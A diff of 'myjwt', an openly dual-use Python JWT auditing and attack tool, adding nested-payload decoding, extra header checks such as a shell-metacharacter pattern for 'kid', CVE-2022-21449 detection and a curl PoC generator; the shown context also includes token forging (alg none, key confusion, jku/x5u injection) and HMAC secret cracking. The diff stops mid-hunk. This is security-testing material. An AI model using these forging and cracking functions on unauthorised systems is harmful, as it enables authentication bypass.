@@ -3,6 +3,8 @@
 myjwt - JWT Security Testing Framework
 BY HACKITA - OFFENSIVE SECURITY
 https://hackita.it/articoli/jwt/
+
+Offline/online JWT decoder, auditor, attacker, and PoC generator.
 """
 import argparse
 import base64
@@ -17,20 +19,22 @@ import time
 import urllib.request
 import urllib.error
 import ssl
+import gzip
+import zlib
 from datetime import datetime, timezone
 
 # --- HACKITA BRANDING COLORS ---
-RED    = "\033[38;5;196m"  # Hackita Bright Red
-DRED   = "\033[38;5;88m"   # Hackita Dark Red
-WHITE  = "\033[38;5;255m"  # Pure White
-BLACK  = "\033[38;5;236m"  # Dark Grey
-GREEN  = "\033[38;5;46m"   # Green
-YELLOW = "\033[38;5;226m"  # Yellow
-DIM    = "\033[2m"         # Dim text
+RED    = "\033[38;5;196m"
+DRED   = "\033[38;5;88m"
+WHITE  = "\033[38;5;255m"
+BLACK  = "\033[38;5;236m"
+GREEN  = "\033[38;5;46m"
+YELLOW = "\033[38;5;226m"
+DIM    = "\033[2m"
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 
-VERSION = "4.1"
+VERSION = "myjwt"
 CURRENT_LANG = "en"
 
 # --- TRANSLATIONS ---
@@ -89,6 +93,8 @@ TRANSLATIONS = {
         "http_diff": "[+] Different response! Possible bypass.",
         "http_suspicious": "[?] Different response, investigate manually.",
         "http_error": "[!] HTTP Error: {error}",
+        "http_success_str": "[+] Success string found in response.",
+        "http_failure_str": "[!] Failure string found in response.",
         "invalid_base64": "Invalid Base64URL characters in segment",
         "invalid_length": "Invalid Base64URL length",
         "base64_error": "Base64URL decode failed: {error}",
@@ -108,6 +114,18 @@ TRANSLATIONS = {
         "secret_required": "-k/--secret required for forge",
         "pubkey_load_error": "Failed to load public key: {error}",
         "invalid_ecdsa_len": "Invalid ECDSA signature length",
+        "poc_generated": "[+] Proof of Concept (PoC) generated:",
+        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
+        "cve_2022_21449": "CVE-2022-21449: ECDSA signature malleability (zeroed r/s) may be accepted",
+        "typ_missing": "Missing 'typ' header (token type confusion)",
+        "typ_unexpected": "Unexpected 'typ' header: '{typ}' (expected JWT)",
+        "crit_present": "'crit' header present: {crit} (check if critical parameters are handled)",
+        "b64_false": "'b64' header is false (RFC 7797): payload is not base64url encoded",
+        "jku_suspicious": "'jku' contains suspicious URL: {url}",
+        "x5u_suspicious": "'x5u' contains suspicious URL: {url}",
+        "kid_injection": "'kid' contains dangerous characters: {kid}",
+        "risk_score": "[*] Overall Risk Score: {score} ({level})",
+        "json_output": "[*] JSON output written to {file}",
     },
     "it": {
         "vuln_analysis": "[*] ANALISI VULNERABILITÀ",
@@ -163,6 +181,8 @@ TRANSLATIONS = {
         "http_diff": "[+] Risposta diversa! Possibile bypass.",
         "http_suspicious": "[?] Risposta diversa, investigare manualmente.",
         "http_error": "[!] Errore HTTP: {error}",
+        "http_success_str": "[+] Stringa di successo trovata nella risposta.",
+        "http_failure_str": "[!] Stringa di fallimento trovata nella risposta.",
         "invalid_base64": "Caratteri Base64URL non validi nel segmento",
         "invalid_length": "Lunghezza Base64URL non valida",
         "base64_error": "Decodifica Base64URL fallita: {error}",
@@ -182,6 +202,18 @@ TRANSLATIONS = {
         "secret_required": "-k/--secret richiesto per la contraffazione",
         "pubkey_load_error": "Impossibile caricare la chiave pubblica: {error}",
         "invalid_ecdsa_len": "Lunghezza firma ECDSA non valida",
+        "poc_generated": "[+] Proof of Concept (PoC) generato:",
+        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
+        "cve_2022_21449": "CVE-2022-21449: malleabilità firma ECDSA (r/s azzerati) potrebbe essere accettata",
+        "typ_missing": "Manca l'header 'typ' (confusione tipo token)",
+        "typ_unexpected": "Header 'typ' inatteso: '{typ}' (atteso JWT)",
+        "crit_present": "Header 'crit' presente: {crit} (verifica gestione parametri critici)",
+        "b64_false": "Header 'b64' è false (RFC 7797): payload non è base64url encoded",
+        "jku_suspicious": "'jku' contiene URL sospetto: {url}",
+        "x5u_suspicious": "'x5u' contiene URL sospetto: {url}",
+        "kid_injection": "'kid' contiene caratteri pericolosi: {kid}",
+        "risk_score": "[*] Punteggio di Rischio Complessivo: {score} ({level})",
+        "json_output": "[*] Output JSON scritto in {file}",
     },
     "es": {
         "vuln_analysis": "[*] ANÁLISIS DE VULNERABILIDADES",
@@ -237,6 +269,8 @@ TRANSLATIONS = {
         "http_diff": "[+] ¡Respuesta diferente! Posible bypass.",
         "http_suspicious": "[?] Respuesta diferente, investigar manualmente.",
         "http_error": "[!] Error HTTP: {error}",
+        "http_success_str": "[+] Cadena de éxito encontrada en la respuesta.",
+        "http_failure_str": "[!] Cadena de fallo encontrada en la respuesta.",
         "invalid_base64": "Caracteres Base64URL inválidos en el segmento",
         "invalid_length": "Longitud Base64URL inválida",
         "base64_error": "Fallo en decodificación Base64URL: {error}",
@@ -256,6 +290,18 @@ TRANSLATIONS = {
         "secret_required": "Se requiere -k/--secret para falsificar",
         "pubkey_load_error": "Fallo al cargar la clave pública: {error}",
         "invalid_ecdsa_len": "Longitud de firma ECDSA inválida",
+        "poc_generated": "[+] Prueba de Concepto (PoC) generada:",
+        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
+        "cve_2022_21449": "CVE-2022-21449: maleabilidad de firma ECDSA (r/s a cero) podría ser aceptada",
+        "typ_missing": "Falta el header 'typ' (confusión de tipo de token)",
+        "typ_unexpected": "Header 'typ' inesperado: '{typ}' (esperado JWT)",
+        "crit_present": "Header 'crit' presente: {crit} (verificar manejo de parámetros críticos)",
+        "b64_false": "Header 'b64' es false (RFC 7797): payload no está codificado en base64url",
+        "jku_suspicious": "'jku' contiene URL sospechosa: {url}",
+        "x5u_suspicious": "'x5u' contiene URL sospechosa: {url}",
+        "kid_injection": "'kid' contiene caracteres peligrosos: {kid}",
+        "risk_score": "[*] Puntuación de Riesgo Global: {score} ({level})",
+        "json_output": "[*] Salida JSON escrita en {file}",
     },
     "pt": {
         "vuln_analysis": "[*] ANÁLISE DE VULNERABILIDADES",
@@ -311,6 +357,8 @@ TRANSLATIONS = {
         "http_diff": "[+] Resposta diferente! Possível bypass.",
         "http_suspicious": "[?] Resposta diferente, investigar manualmente.",
         "http_error": "[!] Erro HTTP: {error}",
+        "http_success_str": "[+] String de sucesso encontrada na resposta.",
+        "http_failure_str": "[!] String de falha encontrada na resposta.",
         "invalid_base64": "Caracteres Base64URL inválidos no segmento",
         "invalid_length": "Comprimento Base64URL inválido",
         "base64_error": "Falha na decodificação Base64URL: {error}",
@@ -330,6 +378,18 @@ TRANSLATIONS = {
         "secret_required": "-k/--secret necessário para falsificação",
         "pubkey_load_error": "Falha ao carregar chave pública: {error}",
         "invalid_ecdsa_len": "Comprimento de assinatura ECDSA inválido",
+        "poc_generated": "[+] Prova de Conceito (PoC) gerada:",
+        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
+        "cve_2022_21449": "CVE-2022-21449: maleabilidade de assinatura ECDSA (r/s zerados) pode ser aceita",
+        "typ_missing": "Falta o header 'typ' (confusão de tipo de token)",
+        "typ_unexpected": "Header 'typ' inesperado: '{typ}' (esperado JWT)",
+        "crit_present": "Header 'crit' presente: {crit} (verificar manipulação de parâmetros críticos)",
+        "b64_false": "Header 'b64' é false (RFC 7797): payload não está codificado em base64url",
+        "jku_suspicious": "'jku' contém URL suspeita: {url}",
+        "x5u_suspicious": "'x5u' contém URL suspeita: {url}",
+        "kid_injection": "'kid' contém caracteres perigosos: {kid}",
+        "risk_score": "[*] Pontuação de Risco Geral: {score} ({level})",
+        "json_output": "[*] Saída JSON escrita em {file}",
     },
     "de": {
         "vuln_analysis": "[*] SCHWACHSTELLENANALYSE",
@@ -385,6 +445,8 @@ TRANSLATIONS = {
         "http_diff": "[+] Unterschiedliche Antwort! Möglicher Bypass.",
         "http_suspicious": "[?] Unterschiedliche Antwort, manuell untersuchen.",
         "http_error": "[!] HTTP-Fehler: {error}",
+        "http_success_str": "[+] Erfolgs-String in der Antwort gefunden.",
+        "http_failure_str": "[!] Fehler-String in der Antwort gefunden.",
         "invalid_base64": "Ungültige Base64URL-Zeichen im Segment",
         "invalid_length": "Ungültige Base64URL-Länge",
         "base64_error": "Base64URL-Dekodierung fehlgeschlagen: {error}",
@@ -404,6 +466,18 @@ TRANSLATIONS = {
         "secret_required": "-k/--secret zum Fälschen erforderlich",
         "pubkey_load_error": "Öffentlicher Schlüssel konnte nicht geladen werden: {error}",
         "invalid_ecdsa_len": "Ungültige ECDSA-Signaturlänge",
+        "poc_generated": "[+] Proof of Concept (PoC) generiert:",
+        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
+        "cve_2022_21449": "CVE-2022-21449: ECDSA-Signatur-Malleabilität (r/s genullt) könnte akzeptiert werden",
+        "typ_missing": "'typ' Header fehlt (Token-Typ-Verwechslung)",
+        "typ_unexpected": "Unerwarteter 'typ' Header: '{typ}' (JWT erwartet)",
+        "crit_present": "'crit' Header vorhanden: {crit} (Prüfen, ob kritische Parameter verarbeitet werden)",
+        "b64_false": "'b64' Header ist false (RFC 7797): Payload ist nicht base64url-kodiert",
+        "jku_suspicious": "'jku' enthält verdächtige URL: {url}",
+        "x5u_suspicious": "'x5u' enthält verdächtige URL: {url}",
+        "kid_injection": "'kid' enthält gefährliche Zeichen: {kid}",
+        "risk_score": "[*] Gesamtrisikobewertung: {score} ({level})",
+        "json_output": "[*] JSON-Ausgabe geschrieben nach {file}",
     },
     "fr": {
         "vuln_analysis": "[*] ANALYSE DES VULNÉRABILITÉS",
@@ -459,6 +533,8 @@ TRANSLATIONS = {
         "http_diff": "[+] Réponse différente ! Bypass possible.",
         "http_suspicious": "[?] Réponse différente, à investiguer manuellement.",
         "http_error": "[!] Erreur HTTP : {error}",
+        "http_success_str": "[+] Chaîne de succès trouvée dans la réponse.",
+        "http_failure_str": "[!] Chaîne d'échec trouvée dans la réponse.",
         "invalid_base64": "Caractères Base64URL invalides dans le segment",
         "invalid_length": "Longueur Base64URL invalide",
         "base64_error": "Échec du décodage Base64URL : {error}",
@@ -478,10 +554,21 @@ TRANSLATIONS = {
         "secret_required": "-k/--secret requis pour falsifier",
         "pubkey_load_error": "Échec du chargement de la clé publique : {error}",
         "invalid_ecdsa_len": "Longueur de signature ECDSA invalide",
+        "poc_generated": "[+] Preuve de Concept (PoC) générée :",
+        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
+        "cve_2022_21449": "CVE-2022-21449 : malléabilité de signature ECDSA (r/s mis à zéro) pourrait être acceptée",
+        "typ_missing": "En-tête 'typ' manquant (confusion de type de token)",
+        "typ_unexpected": "En-tête 'typ' inattendu : '{typ}' (JWT attendu)",
+        "crit_present": "En-tête 'crit' présent : {crit} (vérifier la gestion des paramètres critiques)",
+        "b64_false": "L'en-tête 'b64' est false (RFC 7797) : le payload n'est pas encodé en base64url",
+        "jku_suspicious": "'jku' contient une URL suspecte : {url}",
+        "x5u_suspicious": "'x5u' contient une URL suspecte : {url}",
+        "kid_injection": "'kid' contient des caractères dangereux : {kid}",
+        "risk_score": "[*] Score de Risque Global : {score} ({level})",
+        "json_output": "[*] Sortie JSON écrite dans {file}",
     }
 }
 
-# FIX CRITICO: Il parametro si chiama 'msg_key' per non collidere con kwargs 'key'
 def t(msg_key, **kwargs):
     msg = TRANSLATIONS.get(CURRENT_LANG, TRANSLATIONS["en"]).get(msg_key)
     if not msg:
@@ -510,18 +597,17 @@ class JwtError(Exception):
     pass
 
 # --------------------------------------------------------- NESTED PAYLOAD ANALYZER --
-def extract_java_serialized_strings(data):
-    """Estrae le stringhe (TC_STRING) da un flusso Java Serializzato."""
+def extract_java_strings(data):
     strings = []
     i = 0
     while i < len(data):
-        if data[i] == 0x74: # TC_STRING (t)
+        if data[i] == 0x74:
             if i + 3 <= len(data):
                 length = int.from_bytes(data[i+1:i+3], 'big')
                 if i + 3 + length <= len(data):
                     try:
                         val = data[i+3:i+3+length].decode('utf-8', errors='ignore')
-                        if len(val) > 2: # Evita stringhe spazzatura
+                        if len(val) > 2:
                             strings.append(val)
                         i += 3 + length
                         continue
@@ -530,46 +616,104 @@ def extract_java_serialized_strings(data):
         i += 1
     return strings
 
-def decode_nested_base64(val_str):
-    """Tenta di decodificare una stringa Base64/Base64URL."""
-    try:
-        padded = val_str + "=" * (-len(val_str) % 4)
-        decoded = base64.b64decode(padded, validate=True)
-        if decoded.startswith(b'\xac\xed\x00\x05'):
-            return decoded, "Java Serialization"
-    except:
-        pass
-    try:
-        padded = val_str + "=" * (-len(val_str) % 4)
-        decoded = base64.urlsafe_b64decode(padded)
-        if decoded.startswith(b'\xac\xed\x00\x05'):
-            return decoded, "Java Serialization"
-    except:
-        pass
+def extract_php_strings(data):
+    strings = []
+    pattern = re.compile(rb's:(\d+):"(.*?)";')
+    for m in pattern.finditer(data):
+        try:
+            val = m.group(2).decode('utf-8', errors='ignore')
+            if len(val) > 2:
+                strings.append(val)
+        except:
+            pass
+    return strings
+
+def extract_python_pickle(data):
+    strings = []
+    pattern = re.compile(rb'[\x20-\x7E]{4,}')
+    for m in pattern.finditer(data):
+        try:
+            val = m.group(0).decode('utf-8', errors='ignore')
+            if not any(x in val for x in ["__", "builtins", "sys.", "os."]):
+                strings.append(val)
+        except:
+            pass
+    return strings
+
+def try_decompress(data):
+    if data.startswith(b'\x1f\x8b'):
+        try:
+            return gzip.decompress(data), "GZIP Compressed"
+        except:
+            pass
+    if len(data) > 2 and data[0] == 0x78 and data[1] in (0x01, 0x9c, 0xda):
+        try:
+            return zlib.decompress(data), "ZLIB Compressed"
+        except:
+            pass
     return None, None
 
+def decode_nested_base64(val_str):
+    try:
+        padded = val_str + "=" * (-len(val_str) % 4)
+        return base64.b64decode(padded, validate=True)
+    except:
+        pass
+    try:
+        padded = val_str + "=" * (-len(val_str) % 4)
+        return base64.urlsafe_b64decode(padded)
+    except:
+        pass
+    return None
+
 def analyze_nested_payload(payload):
-    """Scansiona il payload alla ricerca di oggetti annidati."""
     for k, v in payload.items():
-        if isinstance(v, str) and len(v) > 20: # Probabile stringa encoded
-            decoded, fmt = decode_nested_base64(v)
-            if decoded:
+        if not isinstance(v, str) or len(v) < 20:
+            continue
+        decoded = decode_nested_base64(v)
+        if not decoded:
+            continue
+        decompressed, comp_type = try_decompress(decoded)
+        if decompressed:
+            print(f"\n{YELLOW}{t('nested_payload', key=k)}{RESET}")
+            print(f"  {WHITE}Tipo: {comp_type}{RESET}")
+            print(f"  {WHITE}Dimensione decompressa: {len(decompressed)} bytes{RESET}")
+            decoded = decompressed
+        fmt = None
+        extracted = []
+        if decoded.startswith(b'\xac\xed\x00\x05'):
+            fmt = "Java Serialization"
+            extracted = extract_java_strings(decoded)
+        elif decoded.startswith(b'O:') or decoded.startswith(b'a:') or decoded.startswith(b's:'):
+            fmt = "PHP Serialization"
+            extracted = extract_php_strings(decoded)
+        elif decoded.startswith(b'\x80\x04') or decoded.startswith(b'\x80\x03'):
+            fmt = "Python Pickle"
+            extracted = extract_python_pickle(decoded)
+        elif decoded.startswith(b'/wEP'):
+            fmt = ".NET ViewState"
+            inner, _ = try_decompress(decoded[2:])
+            if inner:
+                extracted = extract_php_strings(inner)
+        if fmt:
+            print(f"\n{YELLOW}{t('nested_payload', key=k)}{RESET}")
+            print(f"  {WHITE}{t('nested_type', type=fmt)}{RESET}")
+            if extracted:
+                print(f"  {WHITE}{t('nested_extracted')}{RESET}")
+                for s in extracted:
+                    print(f"    {GREEN}- {s}{RESET}")
+            else:
+                print(f"  {DIM}(no printable strings found){RESET}")
+        else:
+            if len(decoded) > 8:
                 print(f"\n{YELLOW}{t('nested_payload', key=k)}{RESET}")
-                print(f"  {WHITE}{t('nested_type', type=fmt)}{RESET}")
-                
-                strings = extract_java_serialized_strings(decoded)
-                if strings:
-                    print(f"  {WHITE}{t('nested_class', class_name=strings[0])}{RESET}")
-                    print(f"  {WHITE}{t('nested_extracted')}{RESET}")
-                    for s in strings[1:]:
-                        print(f"    {GREEN}- {s}{RESET}")
-                else:
-                    print(f"  {WHITE}{t('nested_hex')}{RESET}")
-                    for i in range(0, min(len(decoded), 64), 16):
-                        chunk = decoded[i:i+16]
-                        hex_str = ' '.join(f'{b:02x}' for b in chunk)
-                        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
-                        print(f"    {DRED}{i:08x}{RESET}  {hex_str.ljust(48)}  {WHITE}{ascii_str}{RESET}")
+                print(f"  {WHITE}Tipo: Unknown (Base64 valid, showing hex dump){RESET}")
+                print(f"  {WHITE}{t('nested_hex')}{RESET}")
+                for i in range(0, min(len(decoded), 64), 16):
+                    chunk = decoded[i:i+16]
+                    hex_str = ' '.join(f'{b:02x}' for b in chunk)
+                    ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
+                    print(f"    {DRED}{i:08x}{RESET}  {hex_str.ljust(48)}  {WHITE}{ascii_str}{RESET}")
 
 # --------------------------------------------------------- PARSING & DECODE --
 def b64url_decode(segment):
@@ -586,7 +730,8 @@ def b64url_decode(segment):
         raise JwtError(t("base64_error", error=e))
 
 def b64url_encode(data):
-    if isinstance(data, str): data = data.encode()
+    if isinstance(data, str):
+        data = data.encode()
     return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
 
 def strict_json_loads(data):
@@ -598,7 +743,8 @@ def strict_json_loads(data):
         def hook(pairs):
             d = {}
             for k, v in pairs:
-                if k in d: duplicates.append(k)
+                if k in d:
+                    duplicates.append(k)
                 d[k] = v
             return d
         return json.loads(text, object_pairs_hook=hook), duplicates
@@ -609,17 +755,13 @@ def parse_token(token):
     parts = token.split(".")
     if len(parts) not in (3, 5):
         raise JwtError(t("expected_parts", parts=len(parts)))
-    
     header_raw = b64url_decode(parts[0])
     header, dup_h = strict_json_loads(header_raw)
-    
     if len(parts) == 5:
         return {"raw": token, "parts": parts, "header": header, "type": "JWE", "duplicates": dup_h}
-    
     payload_raw = b64url_decode(parts[1])
     payload, dup_p = strict_json_loads(payload_raw)
     sig_raw = b64url_decode(parts[2])
-    
     return {
         "raw": token, "parts": parts, "header": header, "payload": payload,
         "signature": sig_raw, "type": "JWS", "duplicates": dup_h + dup_p
@@ -635,7 +777,8 @@ def extract_token(raw):
 # --------------------------------------------------------- CRYPTO ENGINE --
 def verify_hmac(info, secret):
     alg = info["header"].get("alg")
-    if alg not in HMAC_ALGS: raise JwtError(t("unsupported_hmac", alg=alg))
+    if alg not in HMAC_ALGS:
+        raise JwtError(t("unsupported_hmac", alg=alg))
     signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
     expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
     return hmac.compare_digest(expected, info["signature"])
@@ -645,12 +788,10 @@ def verify_asymmetric(info, pub_key_bytes):
         raise JwtError(t("crypto_missing"))
     alg = info["header"].get("alg")
     signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
-    
     try:
         public_key = serialization.load_pem_public_key(pub_key_bytes)
     except Exception as e:
         raise JwtError(t("pubkey_load_error", error=e))
-
     try:
         if alg.startswith("RS"):
             hash_alg = hashes.SHA256() if alg == "RS256" else hashes.SHA384() if alg == "RS384" else hashes.SHA512()
@@ -678,11 +819,13 @@ def verify_asymmetric(info, pub_key_bytes):
 
 # --------------------------------------------------------- ATTACK ENGINE --
 def forge_none(info):
-    header = dict(info["header"]); header["alg"] = "none"
+    header = dict(info["header"])
+    header["alg"] = "none"
     return f"{b64url_encode(json.dumps(header, separators=(',', ':')))}.{info['parts'][1]}."
 
 def forge_confusion(info, pubkey_bytes):
-    header = dict(info["header"]); header["alg"] = "HS256"
+    header = dict(info["header"])
+    header["alg"] = "HS256"
     header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
     signing_input = f"{header_b64}.{info['parts'][1]}".encode()
     sig = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
@@ -700,10 +843,10 @@ def forge_kid(info):
 def forge_claims(info, claims_to_set, secret, jku=None, x5u=None):
     header = dict(info["header"])
     payload = dict(info["payload"])
-    
-    if jku: header["jku"] = jku
-    if x5u: header["x5u"] = x5u
-    
+    if jku:
+        header["jku"] = jku
+    if x5u:
+        header["x5u"] = x5u
     for assignment in claims_to_set:
         k, v_str = assignment.split("=", 1)
         try:
@@ -711,34 +854,34 @@ def forge_claims(info, claims_to_set, secret, jku=None, x5u=None):
         except json.JSONDecodeError:
             v = v_str
         payload[k] = v
-        
     header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
     payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
     signing_input = f"{header_b64}.{payload_b64}".encode()
-    
     alg = header.get("alg", "HS256")
     if alg in HMAC_ALGS:
         sig = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
     else:
         raise JwtError(t("cannot_forge_secret", alg=alg))
-        
     return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"
 
 # --------------------------------------------------------- CRACK ENGINE --
 def crack_hmac(token, wordlist_path, max_lines=None):
     info = parse_token(token)
-    if info["type"] != "JWS": raise JwtError(t("jwe_crack"))
+    if info["type"] != "JWS":
+        raise JwtError(t("jwe_crack"))
     alg = info["header"].get("alg")
-    if alg not in HMAC_ALGS: raise JwtError(t("not_hmac", alg=alg))
+    if alg not in HMAC_ALGS:
+        raise JwtError(t("not_hmac", alg=alg))
     signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
     target_sig = info["signature"]
-
     try:
         with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
             for i, line in enumerate(f):
-                if max_lines and i >= max_lines: break
+                if max_lines and i >= max_lines:
+                    break
                 word = line.rstrip("\n\r")
-                if not word: continue
+                if not word:
+                    continue
                 secret = word.encode()
                 expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
                 if hmac.compare_digest(expected, target_sig):
@@ -763,6 +906,16 @@ def analyze(info, now):
     elif alg.startswith(("RS", "PS", "ES")):
         findings.append(("INFO", t("asym_info", alg=alg)))
     
+    if "typ" not in header:
+        findings.append(("MEDIUM", t("typ_missing")))
+    elif header["typ"] != "JWT":
+        findings.append(("LOW", t("typ_unexpected", typ=header["typ"])))
+    
+    if "crit" in header:
+        findings.append(("MEDIUM", t("crit_present", crit=header["crit"])))
+    if header.get("b64") is False:
+        findings.append(("MEDIUM", t("b64_false")))
+    
     if "exp" not in payload:
         findings.append(("MEDIUM", t("missing_exp")))
     else:
@@ -773,63 +926,81 @@ def analyze(info, now):
             findings.append(("INFO", t("token_expired")))
         elif exp - now > 86400:
             findings.append(("LOW", t("long_lifetime", hours=int((exp-now)/3600))))
-            
+    
     if "iat" in payload:
         iat = payload["iat"]
         if isinstance(iat, (int, float)) and iat > now + 60:
             findings.append(("MEDIUM", t("future_iat")))
-            
+    
     if "iss" not in payload:
         findings.append(("LOW", t("missing_iss")))
     if "aud" not in payload:
         findings.append(("LOW", t("missing_aud")))
-        
+    
     if "kid" in header:
         kid = str(header["kid"])
         if "../" in kid or "/" in kid:
             findings.append(("HIGH", t("kid_traversal")))
         if "'" in kid or '"' in kid or "union" in kid.lower():
             findings.append(("HIGH", t("kid_sqli")))
-            
-    if "jku" in header: findings.append(("MEDIUM", t("jku_present", url=header['jku'])))
-    if "x5u" in header: findings.append(("MEDIUM", t("x5u_present", url=header['x5u'])))
-    if "jwk" in header: findings.append(("HIGH", t("jwk_present")))
-    if "x5c" in header: findings.append(("HIGH", t("x5c_present")))
-        
+        if re.search(r"[;|&$`]", kid):
+            findings.append(("MEDIUM", t("kid_injection", kid=kid)))
+    
+    if "jku" in header:
+        jku = header["jku"]
+        findings.append(("MEDIUM", t("jku_present", url=jku)))
+        if not jku.startswith("https://"):
+            findings.append(("HIGH", t("jku_suspicious", url=jku)))
+    if "x5u" in header:
+        x5u = header["x5u"]
+        findings.append(("MEDIUM", t("x5u_present", url=x5u)))
+        if not x5u.startswith("https://"):
+            findings.append(("HIGH", t("x5u_suspicious", url=x5u)))
+    if "jwk" in header:
+        findings.append(("HIGH", t("jwk_present")))
+    if "x5c" in header:
+        findings.append(("HIGH", t("x5c_present")))
+    
+    # CVE-2022-21449: ECDSA signature malleability
+    if alg and alg.startswith("ES"):
+        sig = info.get("signature", b"")
+        if len(sig) > 0:
+            half = len(sig) // 2
+            r = sig[:half]
+            s = sig[half:]
+            if r == b'\x00' * half or s == b'\x00' * half:
+                findings.append(("CRITICAL", t("cve_2022_21449")))
+    
     sensitive_keys = ["password", "secret", "token", "api_key", "email"]
     for k in payload:
         if any(s in k.lower() for s in sensitive_keys):
             findings.append(("INFO", t("sensitive_claim", key=k)))
-            
+    
     sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
     findings.sort(key=lambda x: sev_order.get(x[0], 5))
     return findings
 
 # --------------------------------------------------------- HTTP ENGINE --
-def test_http_endpoint(url, method, headers_str, new_token, original_token=None, insecure=False):
+def test_http_endpoint(url, method, headers_str, new_token, original_token=None, insecure=False,
+                       success_strings=None, failure_strings=None):
     if not HAS_REQUESTS:
         print(t("requests_missing"))
         return
-    
     headers = {}
     if headers_str:
         for h in headers_str.split(","):
             k, v = h.split(":", 1)
             headers[k.strip()] = v.strip()
-    
     headers["Authorization"] = f"Bearer {new_token}"
-    
     print(f"\n{DRED}{t('http_testing', method=method, url=url)}{RESET}")
     try:
         r_new = requests.request(method, url, headers=headers, timeout=10, verify=not insecure)
         print(f"  {WHITE}{t('http_mutated', status=r_new.status_code, length=len(r_new.text))}{RESET}")
-        
         if original_token:
             headers_orig = headers.copy()
             headers_orig["Authorization"] = f"Bearer {original_token}"
             r_orig = requests.request(method, url, headers=headers_orig, timeout=10, verify=not insecure)
             print(f"  {DIM}{t('http_baseline', status=r_orig.status_code, length=len(r_orig.text))}{RESET}")
-            
             if r_new.status_code == r_orig.status_code and len(r_new.text) == len(r_orig.text):
                 print(f"  {YELLOW}{t('http_identical')}{RESET}")
             elif r_new.status_code == 200 and r_orig.status_code != 200:
@@ -837,6 +1008,16 @@ def test_http_endpoint(url, method, headers_str, new_token, original_token=None,
                 print(f"  {DIM}{r_new.text[:200]}...{RESET}")
             else:
                 print(f"  {YELLOW}{t('http_suspicious')}{RESET}")
+        if success_strings:
+            for s in success_strings.split(","):
+                if s.strip() in r_new.text:
+                    print(f"  {GREEN}{t('http_success_str')}{RESET}")
+                    break
+        if failure_strings:
+            for s in failure_strings.split(","):
+                if s.strip() in r_new.text:
+                    print(f"  {RED}{t('http_failure_str')}{RESET}")
+                    break
     except Exception as e:
         print(f"  {RED}{t('http_error', error=e)}{RESET}")
 
@@ -846,13 +1027,11 @@ def analyze_jwks(url, insecure=False):
     if insecure:
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-
     print(f"{DRED}{t('jwks_fetching', url=url)}{RESET}")
     try:
-        req = urllib.request.Request(url, headers={'User-Agent': 'myjwt/4.1'})
+        req = urllib.request.Request(url, headers={'User-Agent': 'myjwt'})
         with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
             jwks = json.loads(response.read().decode())
-            
         keys = jwks.get("keys", [])
         print(f"{WHITE}{t('jwks_found', count=len(keys))}{RESET}")
         for i, k in enumerate(keys):
@@ -876,7 +1055,10 @@ def main():
 {DRED}  J W T   S E C U R I T Y   T E S T I N G   F R A M E W O R K  {RESET}
 """
 
-    parser = argparse.ArgumentParser(description="myjwt 4.1 - Hackita Framework", formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser = argparse.ArgumentParser(
+        description="myjwt - JWT Security Testing Framework",
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
     parser.add_argument("token", nargs="?", help="JWT token to analyze")
     parser.add_argument("-f", "--file", help="Read token from file")
     parser.add_argument("--jwks", help="Fetch and analyze a JWKS URL")
@@ -893,7 +1075,13 @@ def main():
     parser.add_argument("--insecure", action="store_true", help="Disable TLS verification")
     parser.add_argument("--jku", help="JKU URL to inject")
     parser.add_argument("--x5u", help="X5U URL to inject")
-
+    parser.add_argument("--verify-endpoint", help="Endpoint to verify the forged token against")
+    parser.add_argument("--success-strings", help="Comma-separated strings indicating success")
+    parser.add_argument("--failure-strings", help="Comma-separated strings indicating failure")
+    parser.add_argument("--poc", action="store_true", help="Generate Proof of Concept (curl command)")
+    parser.add_argument("--json", action="store_true", help="Output findings as JSON")
+    parser.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
+    
     lang_group = parser.add_mutually_exclusive_group()
     lang_group.add_argument("-en", action="store_const", const="en", dest="lang", help="English (default)")
     lang_group.add_argument("-it", action="store_const", const="it", dest="lang", help="Italiano")
@@ -902,21 +1090,26 @@ def main():
     lang_group.add_argument("-de", action="store_const", const="de", dest="lang", help="Deutsch")
     lang_group.add_argument("-fr", action="store_const", const="fr", dest="lang", help="Français")
     parser.set_defaults(lang="en")
-
+    
     args = parser.parse_args()
     CURRENT_LANG = args.lang
-
+    
+    if args.no_color or not sys.stdout.isatty():
+        global RED, DRED, WHITE, BLACK, GREEN, YELLOW, DIM, RESET, BOLD
+        RED = DRED = WHITE = BLACK = GREEN = YELLOW = DIM = RESET = BOLD = ""
+    
     if not args.token and not args.file and not args.jwks:
         print(logo)
         parser.print_help()
         sys.exit(2)
-
-    print(logo)
-
+    
+    if sys.stdout.isatty():
+        print(logo)
+    
     if args.jwks:
         analyze_jwks(args.jwks, insecure=args.insecure)
         sys.exit(0)
-
+    
     try:
         raw = open(args.file).read() if args.file else args.token
         token = extract_token(raw)
@@ -924,7 +1117,7 @@ def main():
     except JwtError as e:
